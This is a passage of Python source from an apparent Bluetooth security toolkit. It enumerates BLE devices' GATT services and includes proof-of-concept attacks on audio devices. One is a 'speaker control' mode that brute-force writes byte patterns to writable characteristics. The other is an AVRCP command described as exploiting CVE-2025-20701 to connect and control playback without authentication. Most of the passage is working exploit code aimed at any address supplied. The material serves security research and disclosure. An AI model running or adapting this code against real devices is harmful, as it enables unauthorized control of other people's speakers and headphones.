                        f"Failed to read characteristic {char.uuid}: {e}")

        # Determine device type from multiple signals
        device_types = []
        device_name_lower = (device_info.get("name") or "").lower()
        manufacturer_lower = (device_info.get("manufacturer") or "").lower()
        appearance_name = (device_info.get("appearance_name") or "").lower()

        # Check device name for keywords
        audio_keywords = ["speaker", "headphone", "earphone", "earbud", "headset",
                          "soundbar", "audio", "music", "sound", "bass", "subwoofer",
                          "amp", "amplifier", "receiver", "stereo", "hifi", "hi-fi"]
        watch_keywords = ["watch", "band",
                          "tracker", "fit", "garmin", "fitbit"]
        keyboard_keywords = ["keyboard", "keys", "keeb", "mechanical"]
        mouse_keywords = ["mouse", "trackpad", "trackball", "pointing"]
        phone_keywords = ["phone", "mobile",
                          "iphone", "android", "pixel", "galaxy"]
        tv_keywords = ["tv", "television", "roku",
                       "firestick", "chromecast", "appletv"]

        for keyword in audio_keywords:
            if keyword in device_name_lower:
                device_types.append("🔊 Bluetooth Speaker/Audio")
                break

        for keyword in watch_keywords:
            if keyword in device_name_lower or keyword in appearance_name:
                device_types.append("⌚ Smartwatch/Fitness Tracker")
                break

        for keyword in keyboard_keywords:
            if keyword in device_name_lower:
                device_types.append("⌨️ Keyboard")
                break

        for keyword in mouse_keywords:
            if keyword in device_name_lower:
                device_types.append("🖱️ Mouse/Pointing Device")
                break

        for keyword in phone_keywords:
            if keyword in device_name_lower:
                device_types.append("📱 Mobile Phone")
                break

        for keyword in tv_keywords:
            if keyword in device_name_lower:
                device_types.append("📺 TV/Streaming Device")
                break

        # Check manufacturer for hints
        audio_manufacturers = ["logitech", "bose", "sony", "jbl", "harman", "beats",
                               "sennheiser", "audio-technica", "skullcandy", "jabra",
                               "anker", "soundcore", "marshall", "bang & olufsen", "b&o",
                               "sonos", "ultimate ears", "ue", "creative", "edifier"]

        for mfr in audio_manufacturers:
            if mfr in manufacturer_lower or mfr in device_name_lower:
                if "🔊 Bluetooth Speaker/Audio" not in device_types:
                    device_types.append("🔊 Audio Device (by manufacturer)")
                break

        # Check services for device type hints
        for service_uuid, service_name, service_icon, _ in services_found:
            if "Audio" in service_name or "Handsfree" in service_name or "A2DP" in service_name:
                if "🔊 Bluetooth Speaker/Audio" not in device_types and "🔊 Audio Device (by manufacturer)" not in device_types:
                    device_types.append("🔊 Audio Device")
            if "HID" in service_name:
                if "🎮 Input Device (HID)" not in device_types:
                    device_types.append("🎮 Input Device (HID)")
            if "Heart Rate" in service_name:
                device_types.append("❤️ Fitness/Health Device")
            if "AirPods" in service_name or "apple" in service_name.lower():
                device_types.append("🎧 Apple AirPods")

        # Check appearance for device type
        if "headphone" in appearance_name or "headset" in appearance_name:
            if not any("Audio" in dt or "Speaker" in dt for dt in device_types):
                device_types.append("🎧 Headphones/Headset")
        if "speaker" in appearance_name:
            if not any("Audio" in dt or "Speaker" in dt for dt in device_types):
                device_types.append("🔊 Speaker")
        if "keyboard" in appearance_name:
            if "⌨️ Keyboard" not in device_types:
                device_types.append("⌨️ Keyboard")
        if "mouse" in appearance_name:
            if "🖱️ Mouse/Pointing Device" not in device_types:
                device_types.append("🖱️ Mouse")
        if "watch" in appearance_name:
            if not any("Watch" in dt or "Fitness" in dt for dt in device_types):
                device_types.append("⌚ Watch")
        if "phone" in appearance_name:
            if "📱 Mobile Phone" not in device_types:
                device_types.append("📱 Phone")

        if not device_types:
            device_types = ["❓ Generic BLE Device"]

        # Print Services FIRST
        print_header(f"GATT SERVICES ({len(services_found)} found)")

        # Track unknown characteristics for research guidance
        unknown_characteristics = []

        for service_uuid, service_name, service_icon, service in services_found:
            # Show full UUID for standard services as 0xXXXX, or full 128-bit for custom
            if service_uuid.startswith("0000") and service_uuid.endswith("-0000-1000-8000-00805f9b34fb"):
                display_uuid = f"0x{service_uuid[4:8].upper()} (Bluetooth SIG Standard)"
            else:
                display_uuid = service_uuid

            print(f"\n  {service_icon} \033[1;32m{service_name}\033[0m")
            print(f"     UUID: \033[0;36m{display_uuid}\033[0m")
            print(f"     Characteristics: {len(service.characteristics)}")

            for char in service.characteristics:
                props = []
                if char.properties & 0x01:
                    props.append("Broadcast")
                if char.properties & 0x02:
                    props.append("Read")
                if char.properties & 0x04:
                    props.append("WriteNoResp")
                if char.properties & 0x08:
                    props.append("Write")
                if char.properties & 0x10:
                    props.append("Notify")
                if char.properties & 0x20:
                    props.append("Indicate")
                if char.properties & 0x40:
                    props.append("AuthWrite")
                if char.properties & 0x80:
                    props.append("ExtProps")

                char_uuid = str(char.uuid).lower()

                # Look up characteristic name
                char_name = None
                char_desc = None
                char_vendor = None
                is_standard_char = False

                # Check standard Bluetooth SIG characteristics
                # Handle both full UUID format and Bumble's short format (uuid-16:XXXX)
                if char_uuid.startswith("0000") and char_uuid.endswith("-0000-1000-8000-00805f9b34fb"):
                    # Full 128-bit format: 0000XXXX-0000-1000-8000-00805f9b34fb
                    short_id = char_uuid[4:8]
                    if short_id in CHARACTERISTIC_NAMES:
                        char_name, char_desc = CHARACTERISTIC_NAMES[short_id]
                    display_char_uuid = f"0x{short_id.upper()}"
                    is_standard_char = True
                elif char_uuid.startswith("uuid-16:"):
                    # Bumble short format: uuid-16:XXXX
                    short_id = char_uuid.split(":")[1].lower()
                    if short_id in CHARACTERISTIC_NAMES:
                        char_name, char_desc = CHARACTERISTIC_NAMES[short_id]
                    display_char_uuid = f"0x{short_id.upper()}"
                    is_standard_char = True
                else:
                    display_char_uuid = char_uuid
                    # Check vendor-specific characteristics
                    if char_uuid in VENDOR_CHARACTERISTICS:
                        char_name, char_vendor, char_desc = VENDOR_CHARACTERISTICS[char_uuid]

                if char_name and char_vendor:
                    # Known vendor-specific characteristic
                    print(f"       • \033[1;33m{char_name}\033[0m")
                    print(f"         UUID: {display_char_uuid}")
                    print(f"         Vendor: \033[1;35m{char_vendor}\033[0m")
                    print(f"         \033[0;90m{char_desc}\033[0m")
                    print(f"         Properties: [{', '.join(props)}]")
                elif char_name:
                    # Known standard characteristic
                    print(
                        f"       • \033[1;33m{char_name}\033[0m ({display_char_uuid})")
                    print(f"         \033[0;90m{char_desc}\033[0m")
                    print(f"         Properties: [{', '.join(props)}]")
                elif is_standard_char:
                    # Standard Bluetooth SIG characteristic but not in our lookup table
                    print(
                        f"       • \033[0;37m{display_char_uuid}\033[0m (Bluetooth SIG): [{', '.join(props)}]")
                else:
                    # Unknown vendor characteristic
                    print(
                        f"       • \033[0;37m{display_char_uuid}\033[0m: [{', '.join(props)}]")
                    print(
                        f"         \033[0;90m⚠ Unknown vendor characteristic\033[0m")
                    unknown_characteristics.append(
                        (char_uuid, props, service_name))

        # Show unknown characteristics count
        if unknown_characteristics:
            print(
                f"\n  \033[0;33m⚠ Found {len(unknown_characteristics)} unknown vendor characteristic(s)\033[0m")

        # Automated research for unknown characteristics
        if unknown_characteristics:
            print_header("RESEARCHING UNKNOWN CHARACTERISTICS")
            print(
                f"  \033[0;90mPerforming automated lookups for {len(unknown_characteristics)} unknown characteristic(s)...\033[0m\n")

            try:
                research = await research_unknown_characteristics(unknown_characteristics, target_address)
                print_research_results(
                    research, unknown_characteristics, term_width)
            except Exception as e:
                logging.debug(f"Research failed: {e}")
                print(
                    f"  \033[0;33m⚠ Automated research failed (network issue?)\033[0m")
                print(f"  \033[0;90mManual research URLs:\033[0m")
                mac_parts = target_address.replace("/P", "").split(":")
                if len(mac_parts) >= 3:
                    oui = "".join(mac_parts[:3]).upper()
                    print(
                        f"    → https://maclookup.app/search/result?mac={oui}")
                print(
                    f"    → https://github.com/NordicSemiconductor/bluetooth-numbers-database")
                for uuid, _, _ in unknown_characteristics[:3]:
                    print(f"    → Google: \"{uuid}\"")

        # Print Device Information at the end (after all checks)
        print_header("DEVICE SUMMARY")
        print_field("Address", target_address)
        print_field("Device Type", ", ".join(set(device_types)))
        print_field("Name", device_info["name"])
        if device_info["appearance"]:
            print_field(
                "Appearance", f"{device_info['appearance_name']} ({device_info['appearance']})")
        print_field("Manufacturer", device_info["manufacturer"])
        print_field("Model", device_info["model"])
        print_field("Serial Number", device_info["serial"])
        print_field("Firmware Rev", device_info["firmware"])
        print_field("Hardware Rev", device_info["hardware"])
        print_field("Software Rev", device_info["software"])
        if device_info["battery"] is not None:
            battery_bar = "█" * \
                (device_info["battery"] // 10) + "░" * \
                (10 - device_info["battery"] // 10)
            print_field(
                "Battery", f"{device_info['battery']}% [{battery_bar}]")
        if device_info.get("battery_state") is not None:
            state_val = device_info["battery_state"]
            # Decode battery power state flags
            states = []
            if state_val & 0x01:
                states.append("Present")
            if state_val & 0x02:
                states.append("Discharging")
            if state_val & 0x04:
                states.append("Charging")
            if state_val & 0x08:
                states.append("Critical")
            print_field("Battery State", ", ".join(states)
                        if states else f"0x{state_val:02X}")
        print_field("Total Services", len(services_found))
        print_field("Unknown Characteristics", len(
            unknown_characteristics) if unknown_characteristics else "None")
        print_field("Connection Status", "\033[1;32mConnected\033[0m")

        print(f"\n\033[1;36m{'═' * term_width}\033[0m\n")

    except Exception as e:
        logging.error("Enumeration failed: %s", e)
        import traceback
        traceback.print_exc()
    finally:
        try:
            if connection:
                await connection.disconnect()
            if t:
                await t.close()
        except Exception:
            pass


# =============================================================================
# BLE SPEAKER CONTROL PoC
# =============================================================================

# Common media control command patterns used by various vendors
MEDIA_CONTROL_PATTERNS = {
    "play": [
        bytes([0x01]),           # Simple play command
        bytes([0x00, 0x01]),     # Play with prefix
        bytes([0x41]),           # ASCII 'A' - some use this
        bytes([0xB0]),           # AVRCP-like play
        bytes([0x01, 0x00]),     # Little-endian play
        b"play",                 # ASCII command
        # Common Chinese module format
        bytes([0x7E, 0x04, 0x03, 0x00, 0x00, 0x00, 0xEF]),
    ],
    "pause": [
        bytes([0x02]),
        bytes([0x00, 0x02]),
        bytes([0xB1]),           # AVRCP-like pause
        bytes([0x02, 0x00]),
        b"pause",
        bytes([0x7E, 0x04, 0x03, 0x00, 0x01, 0x00, 0xEF]),
    ],
    "next": [
        bytes([0x03]),
        bytes([0x00, 0x03]),
        bytes([0xB3]),           # AVRCP-like next
        b"next",
        bytes([0x7E, 0x04, 0x01, 0x00, 0x00, 0x00, 0xEF]),
    ],
    "prev": [
        bytes([0x04]),
        bytes([0x00, 0x04]),
        bytes([0xB4]),           # AVRCP-like prev
        b"prev",
        bytes([0x7E, 0x04, 0x02, 0x00, 0x00, 0x00, 0xEF]),
    ],
    "vol-up": [
        bytes([0x05]),
        bytes([0x00, 0x05]),
        bytes([0x41]),           # Volume up
        b"vol+",
        bytes([0x7E, 0x04, 0x04, 0x00, 0x00, 0x00, 0xEF]),
    ],
    "vol-down": [
        bytes([0x06]),
        bytes([0x00, 0x06]),
        bytes([0x42]),           # Volume down
        b"vol-",
        bytes([0x7E, 0x04, 0x05, 0x00, 0x00, 0x00, 0xEF]),
    ],
    "mute": [
        bytes([0x07]),
        bytes([0x00, 0x07]),
        bytes([0x43]),           # Mute toggle
        b"mute",
    ],
}

# Known speaker/audio control service UUIDs
KNOWN_AUDIO_SERVICES = {
    "0000110b-0000-1000-8000-00805f9b34fb": "Audio Sink (A2DP)",
    "0000110a-0000-1000-8000-00805f9b34fb": "Audio Source",
    "0000110e-0000-1000-8000-00805f9b34fb": "AVRCP Target",
    "0000110c-0000-1000-8000-00805f9b34fb": "AVRCP Controller",
    "0000111e-0000-1000-8000-00805f9b34fb": "Handsfree",
    "00001108-0000-1000-8000-00805f9b34fb": "Headset",
    # Logitech-specific (from our scan)
    "000061fe-0000-1000-8000-00805f9b34fb": "Logitech Proprietary",
}


async def command_ble_speaker(args: argparse.Namespace):
    """Bluetooth speaker control PoC - probe and control audio devices via BLE.

    This command demonstrates that BLE-connected speakers often expose control
    characteristics without authentication, allowing unauthorized:
    - Media playback control (play, pause, skip)
    - Volume control
    - Device status reading

    This is a proof-of-concept for demonstrating BLE audio device security.
    """
    from bumble.device import Device, DeviceConfiguration, Peer
    from bumble.transport import open_transport_or_link
    from bumble.hci import Address

    controller = args.controller or "usb:0"
    target_address = args.target_address
    action = getattr(args, 'action', 'probe')
    char_uuid = getattr(args, 'char_uuid', None)
    write_data = getattr(args, 'write_data', None)
    timeout = getattr(args, 'timeout', 30.0)

    if not target_address:
        logging.error("Target address required. Use --target-address")
        return

    release_bluetooth_controller(controller)

    term_width = os.get_terminal_size().columns

    print(f"\n\033[1;36m{'═' * term_width}\033[0m")
    print(f"\033[1;36m  BLE SPEAKER CONTROL PoC\033[0m")
    print(f"\033[1;36m{'═' * term_width}\033[0m\n")
    print(f"  Target: {target_address}")
    print(f"  Action: {action}")
    if char_uuid:
        print(f"  Characteristic: {char_uuid}")
    print()

    t = None
    connection = None
    device = None

    try:
        t = await open_transport_or_link(controller)
        device_config = DeviceConfiguration()
        device_config.name = "RACE-Speaker-PoC"
        device_config.address = Address.generate_static_address()
        device = Device.from_config_with_hci(device_config, t.source, t.sink)
        await device.power_on()

        # Connect to device - auto-detect address type
        # Parse address - check for explicit type suffix
        addr_str = target_address.replace("/P", "").replace("/R", "")
        if "/P" in target_address:
            # Explicit public address
            address_types = [(Address.PUBLIC_DEVICE_ADDRESS, "public")]
        elif "/R" in target_address:
            # Explicit random address
            address_types = [(Address.RANDOM_DEVICE_ADDRESS, "random")]
        else:
            # Auto-detect: try public first (most common for commercial devices), then random
            address_types = [
                (Address.PUBLIC_DEVICE_ADDRESS, "public"),
                (Address.RANDOM_DEVICE_ADDRESS, "random")
            ]

        connection = None
        for addr_type, addr_type_name in address_types:
            address = Address(addr_str, addr_type)

            if len(address_types) > 1:
                print(f"  Trying {addr_type_name} address...")

            print(f"  Connecting to {addr_str} ({addr_type_name})...")

            try:
                connection = await asyncio.wait_for(
                    device.connect(address),
                    timeout=timeout
                )
                print(
                    f"  \033[1;32mConnected!\033[0m Handle: 0x{connection.handle:04X}\n")
                break  # Success!
            except asyncio.TimeoutError:
                print(
                    f"  \033[1;31mConnection timed out after {timeout}s\033[0m")
                if addr_type_name == address_types[-1][1]:
                    raise  # Last attempt, propagate error
                continue
            except Exception as e:
                print(f"  \033[1;31mConnection failed: {e}\033[0m")
                if addr_type_name == address_types[-1][1]:
                    raise  # Last attempt, propagate error
                continue

        if connection is None:
            print(
                f"  \033[1;31mFailed to connect with any address type\033[0m")
            return

        # Discover services
        print(f"  Discovering GATT services...")
        peer = Peer(connection)
        await peer.discover_services()
        await peer.discover_characteristics()

        # Collect all characteristics
        all_chars = []
        writable_chars = []
        readable_chars = []

        for service in peer.services:
            service_uuid = str(service.uuid).lower()
            for char in service.characteristics:
                char_uuid_str = str(char.uuid).lower()
                props = []
                if char.properties & 0x02:
                    props.append("Read")
                    readable_chars.append((service_uuid, char))
                if char.properties & 0x04:
                    props.append("WriteNoResp")
                    writable_chars.append((service_uuid, char, "WriteNoResp"))
                if char.properties & 0x08:
                    props.append("Write")
                    writable_chars.append((service_uuid, char, "Write"))
                if char.properties & 0x10:
                    props.append("Notify")
                if char.properties & 0x20:
                    props.append("Indicate")

                all_chars.append({
                    "service": service_uuid,
                    "char": char,
                    "uuid": char_uuid_str,
                    "props": props
                })

        print(
            f"  Found {len(all_chars)} characteristics ({len(writable_chars)} writable, {len(readable_chars)} readable)\n")

        def print_header(title):
            print(f"\n\033[1;36m{'─' * term_width}\033[0m")
            print(f"\033[1;36m  {title}\033[0m")
            print(f"\033[1;36m{'─' * term_width}\033[0m")

        if action == "probe":
            # Probe mode - analyze the device for potential control characteristics
            print_header("SPEAKER CONTROL ANALYSIS")

            print(
                f"\n  \033[1;33m🔍 Writable Characteristics (potential controls):\033[0m\n")

            for svc_uuid, char, write_type in writable_chars:
                char_uuid_str = str(char.uuid).lower()

                # Try to identify purpose
                purpose = "Unknown"
                if "2a00" in char_uuid_str:
                    purpose = "Device Name (not a control)"
                elif any(x in char_uuid_str for x in ["ffd1", "ffd2", "ffe1", "ffe2"]):
                    purpose = "⚡ UART TX/RX - likely command channel!"
                elif "control" in char_uuid_str or "cmd" in char_uuid_str:
                    purpose = "⚡ Likely control characteristic!"

                print(f"    • {char_uuid_str}")
                print(f"      Service: {svc_uuid[:8]}...")
                print(f"      Write Type: {write_type}")
                print(f"      Purpose: {purpose}")
                print()

            print(f"  \033[1;33m📋 Suggested Commands:\033[0m\n")
            print(f"    Try reading all characteristics to understand the device:")
            print(
                f"    \033[0;36m  python race_toolkit.py -c {controller} --target-address {target_address} ble-speaker --action read-all\033[0m\n")
            print(f"    Try writing test patterns to find control characteristics:")
            print(
                f"    \033[0;36m  python race_toolkit.py -c {controller} --target-address {target_address} ble-speaker --action write-test\033[0m\n")
            print(f"    Try specific media control:")
            print(
                f"    \033[0;36m  python race_toolkit.py -c {controller} --target-address {target_address} ble-speaker --action play\033[0m\n")

        elif action == "read-all":
            # Read all readable characteristics
            print_header("READING ALL CHARACTERISTICS")

            for svc_uuid, char in readable_chars:
                char_uuid_str = str(char.uuid).lower()
                try:
                    value = await asyncio.wait_for(peer.read_value(char), timeout=5.0)

                    # Try to interpret the value
                    hex_val = value.hex() if value else "(empty)"
                    try:
                        ascii_val = value.decode(
                            'utf-8', errors='replace') if value else ""
                        ascii_val = ''.join(
                            c if c.isprintable() else '.' for c in ascii_val)
                    except Exception:
                        ascii_val = ""

                    print(f"\n  \033[1;32m✓\033[0m {char_uuid_str}")
                    print(f"    Hex: {hex_val}")
                    if ascii_val and len(ascii_val) > 0:
                        print(f"    ASCII: \"{ascii_val}\"")
                    if len(value) == 1:
                        print(f"    Int: {value[0]}")
                    elif len(value) == 2:
                        print(f"    Int16: {int.from_bytes(value, 'little')}")

                except asyncio.TimeoutError:
                    print(
                        f"\n  \033[0;33m⏱\033[0m {char_uuid_str} - Read timeout")
                except Exception as e:
                    print(f"\n  \033[0;31m✗\033[0m {char_uuid_str} - {e}")

        elif action == "write-test":
            # Probe writable characteristics with test patterns
            print_header("PROBING WRITABLE CHARACTERISTICS")
            print(
                f"\n  \033[0;33m⚠ This will write test data to the device!\033[0m\n")

            for svc_uuid, char, write_type in writable_chars:
                char_uuid_str = str(char.uuid).lower()

                # Skip standard characteristics
                if char_uuid_str.startswith("00002a") or "2a" in char_uuid_str[:10]:
                    continue

                print(f"\n  Testing: {char_uuid_str}")

                # First, try to read the characteristic to determine expected length
                expected_len = None
                current_value = None
                if char in [c for _, c in readable_chars]:
                    try:
                        current_value = await asyncio.wait_for(
                            peer.read_value(char), timeout=2.0)
                        expected_len = len(current_value)
                        print(
                            f"    Current value: {current_value.hex()} ({expected_len} bytes)")
                    except Exception:
                        pass

                # Build test patterns based on detected length
                test_patterns = []

                if expected_len == 1:
                    # Single byte controls
                    test_patterns = [
                        (bytes([0x00]), "Reset/Stop (0x00)"),
                        (bytes([0x01]), "Play/Start (0x01)"),
                        (bytes([0x02]), "Pause (0x02)"),
                        (bytes([0x03]), "Next (0x03)"),
                        (bytes([0x04]), "Prev (0x04)"),
                    ]
                    # Also try incrementing/decrementing current value
                    if current_value:
                        val = current_value[0]
                        if val > 0:
                            test_patterns.append(
                                (bytes([val - 1]), f"Decrement ({val-1})"))
                        if val < 255:
                            test_patterns.append(
                                (bytes([val + 1]), f"Increment ({val+1})"))

                elif expected_len == 2:
                    # 2-byte commands (common for media control)
                    test_patterns = [
                        (bytes([0x00, 0x00]), "Zero (0x0000)"),
                        (bytes([0x00, 0x01]), "Play (0x0001)"),
                        (bytes([0x00, 0x02]), "Pause (0x0002)"),
                        (bytes([0x01, 0x00]), "Play alt (0x0100)"),
                        (bytes([0x02, 0x00]), "Pause alt (0x0200)"),
                        (bytes([0xCD, 0x00]), "AVRCP Play (0xCD00)"),
                        (bytes([0xCE, 0x00]), "AVRCP Pause (0xCE00)"),
                    ]

                elif expected_len and expected_len > 2:
                    # Longer packets - try preserving structure, changing first/last bytes
                    if current_value:
                        # Try flipping first byte
                        modified = bytearray(current_value)
                        modified[0] = 0x01 if modified[0] == 0x00 else 0x00
                        test_patterns.append(
                            (bytes(modified), f"Toggle first byte"))

                        # Try flipping last byte
                        modified = bytearray(current_value)
                        modified[-1] = 0x01 if modified[-1] == 0x00 else 0x00
                        test_patterns.append(
                            (bytes(modified), f"Toggle last byte"))

                        # Try all zeros of same length
                        test_patterns.append(
                            (bytes(expected_len), f"All zeros ({expected_len}b)"))

                        # Try all ones of same length
                        test_patterns.append(
                            (bytes([0x01] * expected_len), f"All ones ({expected_len}b)"))
                else:
                    # Unknown length - try common sizes
                    test_patterns = [
                        (bytes([0x01]), "1-byte: Play (0x01)"),
                        (bytes([0x00, 0x01]), "2-byte: Play (0x0001)"),
                        (bytes([0x01, 0x00]), "2-byte: Play alt (0x0100)"),
                        (bytes([0x00, 0x00, 0x01]), "3-byte: Play (0x000001)"),
                        (bytes(20), "20-byte: Zeros"),
                    ]

                for pattern, desc in test_patterns:
                    try:
                        if write_type == "WriteNoResp":
                            await peer.write_value(char, pattern, with_response=False)
                        else:
                            await peer.write_value(char, pattern, with_response=True)
                        print(
                            f"    \033[1;32m✓\033[0m {desc} - Write succeeded!")
                        await asyncio.sleep(0.5)  # Give device time to react

                        # Try to read back the value to see if it changed
                        if char in [c for _, c in readable_chars]:
                            try:
                                new_value = await asyncio.wait_for(
                                    peer.read_value(char), timeout=1.0)
                                if new_value != current_value:
                                    print(
                                        f"        → Value changed to: {new_value.hex()}")
                            except Exception:
                                pass

                    except Exception as e:
                        err_str = str(e)
                        if "INVALID_ATTRIBUTE_LENGTH" in err_str:
                            print(
                                f"    \033[0;90m✗\033[0m {desc} - Wrong length")
                        elif "NOT_PERMITTED" in err_str or "WRITE_NOT_PERMITTED" in err_str:
                            print(
                                f"    \033[0;33m⚠\033[0m {desc} - Not permitted (needs auth?)")
                        else:
                            print(f"    \033[0;31m✗\033[0m {desc} - {e}")

        elif action in MEDIA_CONTROL_PATTERNS:
            # Try to send media control command
            print_header(f"SENDING {action.upper()} COMMAND")

            patterns = MEDIA_CONTROL_PATTERNS[action]

            if char_uuid:
                # User specified a characteristic
                target_chars = [(svc, c, wt) for svc, c, wt in writable_chars
                                if char_uuid.lower() in str(c.uuid).lower()]
                if not target_chars:
                    print(
                        f"\n  \033[0;31m✗ Characteristic {char_uuid} not found or not writable\033[0m")
                    return
            else:
                # Try all writable non-standard characteristics
                target_chars = [(svc, c, wt) for svc, c, wt in writable_chars
                                if not str(c.uuid).lower().startswith("00002a")]

            print(
                f"\n  Trying {len(patterns)} command patterns on {len(target_chars)} characteristic(s)...\n")

            success_count = 0
            for svc_uuid, char, write_type in target_chars:
                char_uuid_str = str(char.uuid).lower()
                print(f"  Characteristic: {char_uuid_str}")

                for pattern in patterns:
                    try:
                        if write_type == "WriteNoResp":
                            await peer.write_value(char, pattern, with_response=False)
                        else:
                            await peer.write_value(char, pattern, with_response=True)

                        print(
                            f"    \033[1;32m✓\033[0m Sent: {pattern.hex()} ({len(pattern)} bytes)")
                        success_count += 1
                        await asyncio.sleep(0.3)

                    except Exception as e:
                        error_str = str(e).lower()
                        if "not permitted" in error_str or "not allowed" in error_str:
                            print(
                                f"    \033[0;33m⚠\033[0m {pattern.hex()} - Not permitted (may need auth)")
                        else:
                            print(
                                f"    \033[0;31m✗\033[0m {pattern.hex()} - {e}")
                print()

            if success_count > 0:
                print(
                    f"\n  \033[1;32m✓ {success_count} write(s) succeeded!\033[0m")
                print(f"    Check if the speaker responded to any command.")
            else:
                print(
                    f"\n  \033[0;33m⚠ No writes succeeded. Device may require authentication.\033[0m")

        elif action in ["play", "pause", "next", "prev", "vol-up", "vol-down", "mute"]:
            # Handle as media control
            print_header(f"SENDING {action.upper()} COMMAND")
            patterns = MEDIA_CONTROL_PATTERNS.get(action, [])

            target_chars = [(svc, c, wt) for svc, c, wt in writable_chars
                            if not str(c.uuid).lower().startswith("00002a")]

            print(
                f"\n  Trying {len(patterns)} patterns on {len(target_chars)} writable characteristic(s)...\n")

            for svc_uuid, char, write_type in target_chars:
                char_uuid_str = str(char.uuid).lower()
                for pattern in patterns:
                    try:
                        await peer.write_value(char, pattern, with_response=(write_type == "Write"))
                        print(
                            f"  \033[1;32m✓\033[0m {char_uuid_str}: Sent {pattern.hex()}")
                        await asyncio.sleep(0.2)
                    except Exception:
                        pass  # Silently skip failures in this mode

        else:
            print(f"\n  Unknown action: {action}")

        print(f"\n\033[1;36m{'═' * term_width}\033[0m\n")

    except asyncio.TimeoutError:
        print(
            f"\n  \033[0;31m✗ Connection timed out after {timeout}s\033[0m\n")
    except Exception as e:
        logging.error("Speaker control failed: %s", e)
        import traceback
        traceback.print_exc()
    finally:
        try:
            if connection:
                await connection.disconnect()
            if t:
                await t.close()
        except Exception:
            pass


async def command_avrcp(args: argparse.Namespace):
    """AVRCP media control via Classic Bluetooth without authentication.

    This command connects to a Bluetooth audio device via Classic Bluetooth
    and uses AVRCP (Audio/Video Remote Control Profile) to control playback.

    This exploits CVE-2025-20701 - devices that allow BR/EDR connections
    without proper authentication, enabling unauthorized media control.
    """
    from bumble.device import Device, DeviceConfiguration
    from bumble.transport import open_transport_or_link
    from bumble.hci import Address
    from bumble.core import BT_BR_EDR_TRANSPORT
    from bumble import avrcp, avc

    controller = args.controller or "usb:0"
    target_address = args.target_address
    action = getattr(args, 'action', 'info')
    repeat_count = getattr(args, 'repeat', 1)
    hold_time = getattr(args, 'hold_time', 0.1)
    timeout = getattr(args, 'timeout', 30.0)

    if not target_address:
        logging.error("Target address required. Use --target-address")
        return

    release_bluetooth_controller(controller)

    term_width = min(os.get_terminal_size().columns, 100)

    # Map actions to AVRCP operation IDs
    AVRCP_OPERATIONS = {
        "play": avc.PassThroughFrame.OperationId.PLAY,
        "pause": avc.PassThroughFrame.OperationId.PAUSE,
        "stop": avc.PassThroughFrame.OperationId.STOP,
        "next": avc.PassThroughFrame.OperationId.FORWARD,
        "prev": avc.PassThroughFrame.OperationId.BACKWARD,
        "vol-up": avc.PassThroughFrame.OperationId.VOLUME_UP,
        "vol-down": avc.PassThroughFrame.OperationId.VOLUME_DOWN,
        "mute": avc.PassThroughFrame.OperationId.MUTE,
        "ff": avc.PassThroughFrame.OperationId.FAST_FORWARD,
        "rewind": avc.PassThroughFrame.OperationId.REWIND,
    }

    print(f"\n\033[1;36m{'═' * term_width}\033[0m")
    print(f"\033[1;36m  AVRCP MEDIA CONTROL - NO AUTHENTICATION\033[0m")
    print(f"\033[1;36m{'═' * term_width}\033[0m\n")
    print(f"  Target: {target_address}")
    print(f"  Action: {action}")
    print(f"  Auth: \033[1;31mDISABLED (CVE-2025-20701 exploit)\033[0m")
    if action != "info":
        print(f"  Repeat: {repeat_count}x")
        print(f"  Hold Time: {hold_time}s")
    print()

    # Use RFCOMMBumbleChecker for consistent connection approach
    checker = RFCOMMBumbleChecker(controller, target_address, False)
    await checker.setup()

    print(
        f"  \033[1;33mConnecting to {target_address} (NO AUTHENTICATION)...\033[0m")

    max_retries = 3
    retry_delay = 2.0
    connected = False

    for attempt in range(max_retries + 1):
        try:
            if checker.device is None:
                logging.error("Bluetooth device not initialized")
                return

            checker.connection = await asyncio.wait_for(
                checker.device.connect(
                    target_address, transport=BT_BR_EDR_TRANSPORT),
                timeout=timeout
            )
            connected = True
            print(f"  \033[1;32m✓ Connected WITHOUT authentication!\033[0m")
            print(f"    Handle: 0x{checker.connection.handle:04X}")
            break

        except asyncio.TimeoutError:
            print(
                f"\n  \033[1;31mConnection timed out after {timeout}s\033[0m")
            break

        except Exception as e:
            error_str = str(e).lower()

            if "page_timeout" in error_str:
                if attempt < max_retries:
                    print(
                        f"  \033[0;33m⚠ Device not responding (attempt {attempt+1}/{max_retries+1})\033[0m")
                    print(f"    Retrying in {retry_delay}s...")
                    await asyncio.sleep(retry_delay)
                    continue
                else:
                    print(
                        f"\n  \033[1;31m✗ Device not responding to Classic Bluetooth\033[0m")
                    print(f"\n  Possible causes:")
                    print(f"    • Device is connected to another phone/computer")
                    print(f"    • Device is in BLE-only mode")
                    print(f"    • Device is out of range or powered off")
                    print(f"\n  Try:")
                    print(f"    • Disconnect the device from your phone first")
                    print(f"    • Put device in pairing mode")
                    print(f"    • Move closer to the device")
                    await checker.close()
                    return

            elif "limited_resources" in error_str:
                print(f"  \033[0;33m⚠ Controller busy, resetting...\033[0m")
                await checker.close()
                release_bluetooth_controller(controller)
                await asyncio.sleep(2.0)
                checker = RFCOMMBumbleChecker(
                    controller, target_address, False)
                await checker.setup()
                continue

            else:
                print(f"\n  \033[1;31mConnection failed: {e}\033[0m")
                await checker.close()
                return

    if not connected:
        await checker.close()
        return

    connection = checker.connection
    avrcp_protocol = None

    try:
        # Connect AVRCP protocol directly - NO AUTHENTICATION
        print(f"\n  \033[1;33mConnecting AVRCP (no authentication)...\033[0m")

        # Create a minimal delegate
        class MinimalDelegate(avrcp.Delegate):
            def __init__(self):
                self.volume = 0x7F

            async def get_supported_player_application_setting_attributes(self):
                return []

            async def get_player_application_setting_attribute_text(self, attribute_ids):
                return []

            async def get_player_application_setting_values(self, attribute_ids):
                return []

            async def get_player_application_setting_value_text(self, attribute_id, value_ids):
                return []

            async def set_player_application_setting_values(self, settings):
                pass

            async def get_element_attributes(self, identifier, attribute_ids):
                return []

            async def inform_battery_status_of_ct(self, battery_status):
                return avrcp.StatusCode.SUCCESS

            async def set_absolute_volume(self, volume):
                self.volume = volume
                return volume

            async def get_now_playing_items(self, *args):
                return 0, []

        delegate = MinimalDelegate()

        # Try AVRCP connection with retries
        avrcp_retries = 3
        for avrcp_attempt in range(avrcp_retries):
            try:
                avrcp_protocol = avrcp.Protocol(delegate)
                await asyncio.wait_for(
                    avrcp_protocol.connect(connection),
                    timeout=10.0
                )
                print(
                    f"  \033[1;32m✓ AVRCP connected without authentication!\033[0m")
                break
            except asyncio.CancelledError:
                print(
